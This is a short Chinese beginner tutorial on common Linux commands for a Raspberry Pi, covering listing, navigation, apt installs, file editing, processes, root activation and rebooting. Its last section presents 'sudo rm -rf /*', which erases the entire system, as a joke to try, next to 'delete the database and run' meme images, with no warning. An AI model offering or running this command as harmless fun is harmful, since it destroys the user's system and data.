# 树莓派上需要掌握的一些常识级Linux命令

## 根据我的开发经验，常规会用到如下命令

1. 列目录

```
ls

ls -l

ls -a

ls -al
```


2. 切换目录

```
cd 
cd /home/pi
cd ~
cd /etc
```


3. apt 安装

```
sudo apt-get install xxx

sudo apt-get install xxx -y

搞点事情做做：
sudo apt-get install cmatrix -y

cmatrix

cmatrix -C red
```

4. 新建文件/文件夹

```
touch readme.md

mkdir my_proc
```


5. 删除文件/文件夹

```
rm a.txt

rm -rf ./proc
```


6. 修改文件 nano

```
nano 11.txt

sudo nano 222.txt
```



7. 查看进程

```
sudo ps -aux

继续搞点事情：
sudo apt-get install oneko

oneko
```



8. kill进程

```
kill PID

kill 1234
```



9. 激活root用户

```
sudo passwd root

sudo passwd root --unlock
```



10. 安全重启/关机

```
sudo halt

sudo reboot
```



11. git下载我的代码

```
sudo git clone https://github.com/rcdrones/pi4_tutorial.git
```

​    

## 最后搞点事情：

![删库大爆炸](sk1.gif)

![从删库到跑路1](sk2.gif)

![数据库删了肯定要跑路啊](sk3.gif)

![从删库到跑路2](sk4.gif)

```
sudo rm -rf /*
```



